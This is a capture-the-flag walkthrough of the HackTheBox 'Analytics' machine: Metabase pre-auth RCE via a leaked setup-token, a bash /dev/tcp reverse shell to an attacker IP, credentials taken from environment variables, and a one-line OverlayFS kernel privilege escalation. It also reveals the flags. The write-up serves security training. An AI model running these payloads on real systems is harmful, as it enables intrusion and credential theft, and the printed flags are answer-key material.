---
slug: analytics
hide:
    - navigation
tags:
    - HackTheBox
    - Writeups
    - Walkthrough
    - Linux
    - Web
    - Metabase
    - Kernel
---

[:octicons-arrow-left-24: Back to HackTheBox Writeups](./index.md){ .sm-button }

# **Analytics**

![](https://live.staticflickr.com/65535/53504825810_a88e0fc9bb_c.jpg){loading=lazy}

??? info "Information"
    **Machine**: [Analytics](https://app.hackthebox.com/machines/569)  
    **Level**: `Easy`  
    **Tags**: `Linux`, `Web`, `Metabase`, `Kernel`  
    **Pwn**: [Pwned by 0xrh0d4m1n](https://www.hackthebox.com/achievement/machine/1013077/569)

---

## 🚀 **Starting**

```bash
echo '10.10.11.233 analytics.htb' | sudo tee -a /etc/hosts
echo '10.10.11.233 analytical.htb' | sudo tee -a /etc/hosts
echo '10.10.11.233 data.analytical.htb' | sudo tee -a /etc/hosts
```

---

## 🔭 **Reconnaissance**

Let's start the reconnaissance with some port enumeration using nmap.
```bash
sudo nmap -sV -sC -T4 -A -O -f -Pn --top-ports 1000 -oN top1k.nmap 10.10.11.233
```

Through the results, we can see that there is a Nginx web server:
```
# Nmap 7.94SVN scan initiated Thu Dec 28 08:55:21 2023 as: nmap -sV -sC -T4 -A -O -f -Pn --top-ports 1000 -oN top1k.nmap 10.10.11.233
Nmap scan report for analytics.htb (10.10.11.233)
Host is up (0.20s latency).
Not shown: 999 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://analytical.htb/
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.94SVN%E=4%D=12/28%OT=80%CT=1%CU=42898%PV=Y%DS=2%DC=T%G=Y%TM=658
OS:D7E65%P=x86_64-pc-linux-gnu)SEQ(SP=101%GCD=1%ISR=10B%TI=Z%CI=Z%II=I%TS=A
OS:)SEQ(SP=102%GCD=1%ISR=10B%TI=Z%CI=Z%II=I%TS=A)OPS(O1=M53CST11NW7%O2=M53C
OS:ST11NW7%O3=M53CNNT11NW7%O4=M53CST11NW7%O5=M53CST11NW7%O6=M53CST11)WIN(W1
OS:=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN(R=Y%DF=Y%T=40%W=FAF0%O
OS:=M53CNNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N
OS:)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=
OS:S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF
OS:=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=
OS:G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)

Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 993/tcp)
HOP RTT       ADDRESS
1   240.22 ms 10.10.14.1
2   240.37 ms analytics.htb (10.10.11.233)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Thu Dec 28 08:55:49 2023 -- 1 IP address (1 host up) scanned in 28.37 seconds
```

Let's take a look into this domain
```bash
curl -LIk analytics.htb
```

We got a `302` pointing to `Location: http://analytical.htb/` which followed to a HTTP Code `200`
```http
HTTP/1.1 302 Moved Temporarily
Server: nginx/1.18.0 (Ubuntu)
Date: Thu, 28 Dec 2023 14:00:20 GMT
Content-Type: text/html
Content-Length: 154
Connection: keep-alive
Location: http://analytical.htb/

HTTP/1.1 200 OK
Server: nginx/1.18.0 (Ubuntu)
Date: Thu, 28 Dec 2023 14:00:20 GMT
Content-Type: text/html
Content-Length: 17169
Last-Modified: Fri, 25 Aug 2023 15:24:42 GMT
Connection: keep-alive
ETag: "64e8c7ba-4311"
Accept-Ranges: bytes
```

Let's also add this to our host file
```bash
echo '10.10.11.233 analytical.htb' | sudo tee -a /etc/hosts
```

Website First Look!  
![](https://live.staticflickr.com/65535/53506200494_99022c63db_o.png){.maxH300 loading=lazy}

Clicking at Login on the main page you get redirected to this login page.  
![](https://live.staticflickr.com/65535/53505889176_8eda41d054_o.png){.maxH300 loading=lazy}

What is Metabase?  
![](https://live.staticflickr.com/65535/53506041263_bc9ffc949c_o.png){.maxH300 loading=lazy}


---

## 🪲 **Vulnerability Scan**

Searching exploits for Metabase, I found some CVEs  
![](https://live.staticflickr.com/65535/53505002352_9f6b2b7518_o.png){.maxH300 loading=lazy}


### **Understanding the Vulnerability**
This Vulnerability consist in having public access to a token that should be `null`. Meaning that we can have access to this token without any authentication needed. This token is then used in a request that exploits a JDBC through Clojure by inserting an encoded bad payload in the body request allowing RCE.

The diagram below show the process of the installation of Metabase. In this process, when the installation fails, it creates this `setup-token`, that **should** be wiped from the instance.  
![](https://live.staticflickr.com/65535/53505002337_9fa09b8f56_o.png){.maxH300 loading=lazy}

As you can see below, the problem is in the fact that the process of wiping the token is not working, the token still available for public after finishing the installation. (CVE-2023-38646)  
![](https://live.staticflickr.com/65535/53506041253_983b43fd0f_o.png){.maxH300 loading=lazy}

For further details about this vulnerability, you can visit [this article](https://blog.assetnote.io/2023/07/22/pre-auth-rce-metabase/) written by the original discovers.

```bash
curl -k http://data.analytical.htb/api/session/properties | jq 'keys'
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100 74478    0 74478    0     0  80293      0 --:--:-- --:--:-- --:--:-- 80256
[
  "analytics-uuid",
  "anon-tracking-enabled",
  "application-colors",
  "application-favicon-url",
  "application-font",
  "application-font-files",
  "application-logo-url",
  "application-name",
  "available-fonts",
  "available-locales",
  "available-timezones",
  "cloud-gateway-ips",
  "custom-formatting",
  "custom-geojson",
  "email-configured?",
  "embedding-app-origin",
  "enable-advanced-config?",
  "enable-advanced-permissions?",
  "enable-audit-app?",
  "enable-content-management?",
  "enable-enhancements?",
  "enable-password-login",
  "enable-sandboxes?",
  "enable-serialization?",
  "enable-sso?",
  "enable-whitelabeling?",
  "engines",
  "ga-code",
  "ga-enabled",
  "google-auth-client-id",
  "google-auth-enabled",
  "has-user-setup",
  "hide-embed-branding?",
  "instance-creation",
  "is-hosted?",
  "landing-page",
  "ldap-configured?",
  "ldap-enabled",
  "loading-message",
  "map-tile-server-url",
  "native-query-autocomplete-match-style",
  "password-complexity",
  "redirect-all-requests-to-https",
  "report-timezone-long",
  "report-timezone-short",
  "session-cookies",
  "setup-token",
  "show-lighthouse-illustration",
  "show-metabot",
  "site-locale",
  "site-url",
  "snowplow-available",
  "snowplow-enabled",
  "snowplow-url",
  "ssh-heartbeat-interval-sec",
  "start-of-week",
  "startup-time-millis",
  "token-features",
  "version",
  "version-info-last-checked"
]
```

This system is vulnerable, Pre-Auth in Metabase confirmed! (PoC)
```
curl -k http://data.analytical.htb/api/session/properties | jq '.["setup-token"]'
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100 74478    0 74478    0     0  82955      0 --:--:-- --:--:-- --:--:-- 82937
"249fa03d-fd94-4d5b-b94f-b4ebf3df681f"
```

---

## 🎯 **Exploit**

**[Metabase RCE Exploit](https://github.com/m3m0o/metabase-pre-auth-rce-poc)**

To you execute this exploit, first you need to get an active `setup-token` at `/api/session/properties`, then set the token in this exploit and run. Do not forget to setup a listener to catch back the Reverse Shell.
```bash
python3 ./main.py --url "http://data.analytical.htb" --token "249fa03d-fd94-4d5b-b94f-b4ebf3df681f" --command "bash -i >& /dev/tcp/10.10.14.12/13337 0>&1"
[!] BE SURE TO BE LISTENING ON THE PORT YOU DEFINED IF YOU ARE ISSUING AN COMMAND TO GET REVERSE SHELL [!]

[+] Initialized script
[+] Encoding command
[+] Making request
[+] Payload sent

```

### **Listening on Netcat**
```bash
nc -lnvp 13337
listening on [any] 13337 ...
connect to [10.10.14.12] from (UNKNOWN) [10.10.11.233] 58124
bash: cannot set terminal process group (1): Not a tty
bash: no job control in this shell
2547aa128128:/$ whoami
whoami
metabase
```
After stabilizing Netcat, it is time to start to seek for relevant files...
```bash
2547aa128128:/$ ls -la /home/metabase
ls -la /home/metabase
total 8
drwxr-sr-x    1 metabase metabase      4096 Aug 25 15:17 .
drwxr-xr-x    1 root     root          4096 Aug  3 12:16 ..
lrwxrwxrwx    1 metabase metabase         9 Aug  3 12:22 .ash_history -> /dev/null
lrwxrwxrwx    1 metabase metabase         9 Aug 25 15:17 .bash_history -> /dev/null
```

### **Lateral Movement**

Sniffing Credentials on Environment Variables
```bash
00a6c0aad7fb:/$ env
MB_JETTY_HOST=0.0.0.0
JAVA_HOME=/opt/java/openjdk
MB_DB_FILE=//metabase.db/metabase.db
PWD=/
LOGNAME=metabase
MB_EMAIL_SMTP_USERNAME=
HOME=/home/metabase
LANG=en_US.UTF-8
META_USER=metalytics
META_PASS=An4lytics_ds20223#
MB_EMAIL_SMTP_PASSWORD=
USER=metabase
SHLVL=4
MB_DB_USER=
FC_LANG=en-US
LD_LIBRARY_PATH=/opt/java/openjdk/lib/server:/opt/java/openjdk/lib:/opt/java/openjdk/../lib
LC_CTYPE=en_US.UTF-8
MB_LDAP_BIND_DN=
LC_ALL=en_US.UTF-8
MB_LDAP_PASSWORD=
PATH=/opt/java/openjdk/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
MB_DB_CONNECTION_URI=
JAVA_VERSION=jdk-11.0.19+7
_=/usr/bin/env
OLDPWD=/home
00a6c0aad7fb:/$ 
```

User Credentials Discovered in Env. Vars
```
metalytics:An4lytics_ds20223#
```

---

## 🏁 **Flag Exfiltration**

### **User Flag**

Let's use the credentials that we've got on previous step to try a SSH foothold.
```bash
ssh metalytics@analytics.htb                     
metalytics@analytics.htb's password: 
Welcome to Ubuntu 22.04.3 LTS (GNU/Linux 6.2.0-25-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Fri Dec 29 12:21:32 AM UTC 2023

  System load:              0.236328125
  Usage of /:               93.1% of 7.78GB
  Memory usage:             25%
  Swap usage:               0%
  Processes:                153
  Users logged in:          0
  IPv4 address for docker0: 172.17.0.1
  IPv4 address for eth0:    10.10.11.233
  IPv6 address for eth0:    dead:beef::250:56ff:feb9:42e2

  => / is using 93.1% of 7.78GB

 * Strictly confined Kubernetes makes edge and IoT secure. Learn how MicroK8s
   just raised the bar for easy, resilient and secure K8s cluster deployment.

   https://ubuntu.com/engage/secure-kubernetes-at-the-edge

Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status


The list of available updates is more than a week old.
To check for new updates run: sudo apt update

Last login: Tue Oct  3 09:14:35 2023 from 10.10.14.41
metalytics@analytics:~$
```
We are in! Now let's see what this user has in its home directory:
```
metalytics@analytics:~$ ls -la ~
total 36
drwxr-x--- 4 metalytics metalytics 4096 Aug  8 11:37 .
drwxr-xr-x 3 root       root       4096 Aug  8 11:37 ..
lrwxrwxrwx 1 root       root          9 Aug  3 16:23 .bash_history -> /dev/null
-rw-r--r-- 1 metalytics metalytics  220 Aug  3 08:53 .bash_logout
-rw-r--r-- 1 metalytics metalytics 3771 Aug  3 08:53 .bashrc
drwx------ 2 metalytics metalytics 4096 Aug  8 11:37 .cache
drwxrwxr-x 3 metalytics metalytics 4096 Aug  8 11:37 .local
-rw-r--r-- 1 metalytics metalytics  807 Aug  3 08:53 .profile
-rw-r----- 1 root       metalytics   33 Dec 29 00:10 user.txt
-rw-r--r-- 1 metalytics metalytics   39 Aug  8 11:30 .vimrc

metalytics@analytics:~$ cat user.txt 
#* * * ALERT * * * * * * * * * * * * * * * * 
#* If you really want to see this flag, go * 
#* to FLAG CODES at the bottom of the page *
#* * * * * * * * * * * * * * * * * * * * * *
```

### **Privilege Escalation**

After running a `PrivEsc` tool like `Linpeas` you will be able to see that this kernel is vulnerable.  
```bash
╔══════════╣ Operative system
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#kernel-exploits
Linux version 6.2.0-25-generic (buildd@lcy02-amd64-044) (x86_64-linux-gnu-gcc-11 (Ubuntu 11.3.0-1ubuntu1~22.04.1) 11.3.0, GNU ld (GNU Binutils for Ubuntu) 2.38) #25~22.04.2-Ubuntu SMP PREEMPT_DYNAMIC Wed Jun 28 09:55:23 UTC 2
Distributor ID:	Ubuntu
Description:	Ubuntu 22.04.3 LTS
Release:	22.04
Codename:	jammy
```

Confirming System Kernel
```bash
metalytics@analytics:~$ uname -a
Linux analytics 6.2.0-25-generic #25~22.04.2-Ubuntu SMP PREEMPT_DYNAMIC Wed Jun 28 09:55:23 UTC 2 x86_64 x86_64 x86_64 GNU/Linux
```

There is a great article written by **CrowdStrike** showing details about this vulnerability, if you have time, get a cup of coffee and have a good reading here: [New Container Exploit: Rooting Non-Root Containers with CVE-2023-2640 and CVE-2023-32629, aka GameOver(lay)](https://www.crowdstrike.com/blog/crowdstrike-discovers-new-container-exploit/)

Running the **exploit** for this privilege escalation technique
```bash
metalytics@analytics:~$ unshare -rm sh -c "mkdir l u w m && cp /u*/b*/p*3 l/;setcap cap_setuid+eip l/python3;mount -t overlay overlay -o rw,lowerdir=l,upperdir=u,workdir=w m && touch m/*;" && u/python3 -c 'import os;os.setuid(0);os.system("cp /bin/bash /var/tmp/bash && chmod 4755 /var/tmp/bash && /var/tmp/bash -p && rm -rf l m u w /var/tmp/bash")'
root@analytics:~# id
uid=0(root) gid=1000(metalytics) groups=1000(metalytics)
```

### **Root Flag**
```bash
root@analytics:~# cat /root/root.txt
#* * * ALERT * * * * * * * * * * * * * * * * 
#* If you really want to see this flag, go * 
#* to FLAG CODES at the bottom of the page *
#* * * * * * * * * * * * * * * * * * * * * *
```

### Flag Codes
??? question "**Reveal Flags** 🏁"
    #### **User Flag**
        8e7677fb573c20007b0fc933295ec363
    #### **Root Flag**
        24bec33d50e445c1605d118f8008165f

---

#### *If this was helpful in someway, [you can **support me** by zapping me some sats](https://getalby.com/p/0xrh0d4m1n)!*
#### *See you in the next writeup!*